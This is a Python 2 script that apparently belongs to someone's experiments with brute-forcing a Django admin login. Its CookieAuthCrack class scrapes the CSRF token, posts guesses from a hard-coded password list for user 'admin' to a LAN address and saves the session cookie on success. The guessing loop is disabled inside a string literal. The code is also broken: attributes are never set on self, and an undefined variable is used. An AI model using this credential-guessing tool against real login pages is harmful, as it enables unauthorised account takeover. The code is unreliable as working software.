#!/usr/bin/python
#coding=utf8
#filename:web_auth_cookie_django2.py
"""
20130716-1500 http://192.168.1.214:8000/admin/
Python3 urllib 实例
http://www.itwhy.org/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/python/python3-urllib-%E5%AE%9E%E4%BE%8B.html
"""
import urllib
import urllib2
import cookielib
import time

class CookieAuthCrack():
    def __init__(self, user_agent=None):
        url11 = "http://192.168.192.214:8000/admin/"
        url_pre = "http://192.168.192.214:8000/blog/add/"
        url_pre2 = "http://192.168.192.214:8000/admin/auth/user/1/"
        cookie_file11 = "/tmp/cookie11.txt"
        agent11 = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
        user11 = "admin"
        pwd11 = ['admin2', 'aaa', 'bbb', 'ksksie','ssdssw','scbh001', 'admin']
        csrfM = ""

        if not user_agent:
            user_agent = self.agent11
        self.opener = urllib2.build_opener()
        urllib2.install_opener(self.opener)
        self.client_headers = ('User-Agent', user_agent)
        self.opener.addheaders = [self.client_headers]
        self.post_dict = {}

    def add_cookie(self):
        self.ckjar = cookielib.MozillaCookieJar(self.cookie_file11)
        self.opener.add_handler(urllib2.HTTPCookieProcessor(self.ckjar))

    def read_url(self, url, charset='utf-8'):
        try:
            response = urllib2.urlopen(url)
        except urllib2.HTTPError, e:
            print "at urllib2.urlopen, raise ERROR (", e, ")"
            return
        tmp = response.read()
        return tmp

    def read_url_with_cookie(self, url):
        if not url:
            return
        try:
            req = urllib2.Request(url)
            response = self.opener.open(req)
        except urllib2.HTTPError, e:
            print "opener.open(), raise ERROR (", e, ")"
            return
        tmp = response.read()
        return tmp

    def get_cookie(self, filename):
        if not filename:
            self.ckjar.load()
        else:
            self.ckjar.filename = filename
            self.ckjar.load()

    def get_csrf(self, response=None):
        if not response:
            return
        index = response.find('csrfmiddlewaretoken')
        if index > 0:
            tmp2 = response[index:index+60]
            self.csrfM = tmp2.split("'")[2]
        else:
            self.csrfM = "not found"
        return self.csrfM

    def make_dict(self, post_data={}):
        if post_data.get('user'):
            self.post_dict[post_data['user']] = "AAAAAA"
        if post_data.get('passwd'):
            self.post_dict[post_data['passwd']] = "pwdpwdpwd"
        if post_data.get('other', None):
            print post_data.get('other')
            for other_key in post_data['other']:
                self.post_dict[other_key] = post_data['other'][other_key]
        return

    def crack(self, url=None, username=None, pwd_list=None, post_data=None):
        if not url:
            url = self.url11
        if not pwd_list:
            pwd_list = self.pwd11
        if not username:
            username = self.user11

        if not self.csrfM:
            self.get_csrf(self.read_url_with_cookie(url))

        self.post_dict['username'] = username
        self.post_dict['password'] = key1
        self.post_dict[post_data['user']] = username
        if post_data['other']:
            for other_key in post_data['other']:
                self.post_dict[other_key] = post_data[other_key]

        if self.csrfM != "not found":
            self.post_dict['csrfmiddlewaretoken'] =  self.csrfM
        """
        for key1 in pwd_list:
            self.post_dict[post_data['pwd']] = key1
            pwd_encode = urllib.urlencode(self.post_dict)

            try:
                req = urllib2.Request(url)
                response = self.opener.open(req, pwd_encode)
            except urllib2.HTTPError, e:
                print "at opener.open, raise ERROR (", e, ") "
                return
            response_resu = response.getcode()
            if response_resu == 200:
                response_html = response.read()
                #判断是通过验证，标志是***用户登陆失败***
                case = response_html.find('Please enter the correct')
                if case != -1:
                    print "false(%s)DEBUG" %( key1 )
                    continue
                else:
                    print "Find the key(%s), %s" % (key1, time.ctime())
                    self.ckjar.save()
                    return key1
        return
        """

if __name__ == "__main__":
    s11 = CookieAuthCrack()
    s11.add_cookie()
    post_data1 = {
        'user': 'username',
        'passwd': 'password',
        'other': {'other1': 'OTHER123',
                  'other2': 'OTHER234',
                  'this_is_the_login_form': 1,
                  'next': '/admin/',
                  }
        }
    # pwd = s11.crack(post_data)
    s11.make_dict(post_data1)
    # print s11.post_dict
    print "test2"
    s12 = CookieAuthCrack()
    print s12.post_dict
    post_data2 = {
        'user': 'user1',
        'passwd': 'passwd1',
        'other': {'this_is_the_login_form': 1,
                  'next': '/admin/',
                  }
        }
    s12.make_dict(post_data2)
    print s12.post_dict
    s13 = CookieAuthCrack()
    print s13
